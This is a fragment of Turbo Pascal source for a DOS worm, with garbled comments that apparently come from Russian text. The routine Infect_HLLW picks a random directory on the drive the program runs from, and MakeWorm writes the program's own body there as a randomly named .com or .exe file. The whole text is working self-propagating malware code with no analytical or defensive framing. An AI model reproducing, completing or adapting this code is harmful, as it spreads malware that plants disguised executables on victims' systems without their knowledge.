   {---------------------------------------------------------------------------}
   procedure MakeWorm(Dir:string);           {á®§¤ ¥¬ ç¥à¢ï á® á«ãç ©ë¬ ¨¬¥¥¬}
   var f:file;
       i,d,C:byte;
       M:integer;
   begin
   {-- ‘®§¤ ¥¬ ¨¬ï}
   d:=random(8)+1;
   NewName:='';
   for i:=1 to d do NewName:=NewName+chr(random(26)+97);
   d:=random(255);
   if d div 2 = d/2 then NewName:=NewName+'.com' else NewName:=NewName+'.exe';
   {-- ‘®§¤ ¥¬ ä ©«}
   NewName:=Dir+'\'+NewName;               {¤®¯®«ï¥¬ ¨¬ï ¯ãâ¥¬}
   assign(f,NewName);rewrite(f,1);
   blockwrite(f,Body,Len);
   close(f);
   end;
   {---------------------------------------------------------------------------}
   procedure Infect_HLLW;
   var Num:integer;       {®¬¥à ¨â¥à¥áãîé¥© ¤¨à¥ªâ®à¨¨}
       P:string;          { ©¤¥ ï ¤¨à¥ªâ®à¨ï}
       Y:boolean;         {¯à¨§ ª â®£®, çâ® ¤®è«¨ ¤® âã¯¨ª }
   {---------------------------------------------------------------------------}
   function SumDir(Dir:string):integer;        {áç¨â ¥¬ ª®«-¢® ¤¨à¥ªâ®à¨©}
   var N:searchrec;
       D:integer;
   begin
   D:=0;
   Dir:=Dir+'\';
   findfirst(Dir+'*.*',$3F,N);
   while doserror=0 do
     begin
     with N do if (Attr and 16<>0) and (Name[1]<>'.') then D:=D+1;
     findnext(N);
     end;
   SumDir:=D;
   end;
   {---------------------------------------------------------------------------}
   procedure FindDir(var Dir:string;D:integer);       {¨áª âì ã¦ãî ¤¨à¥ªâ®à¨î}
   var N:searchrec;
       K:integer;
   begin
   if D=0 then Y:=true else
     begin
     K:=0;
     Dir:=Dir+'\';
     findfirst(Dir+'*.*',$3F,N);
     while doserror=0 do
       begin
       with N do if (Attr and 16<>0) and (Name[1]<>'.') then K:=K+1;
       if K=D then
          begin
          P:=P+N.name;
          exit;
          end;
       findnext(N);
       end;
     end;
   end;
   {---------------------------------------------------------------------------}
   begin
   P:=copy(fexpand(paramstr(0)),1,2);    {®¯à¥¤¥«¨«¨ ¨¬ï ¤¨áª }
   Y:=false;
   while Y=false do
     begin
     Num:=random(SumDir(P));
     FindDir(P,Num);
     end;
   MakeWorm(P);                          {á®§¤ ¥¬ ç¥à¢ï}
   end;
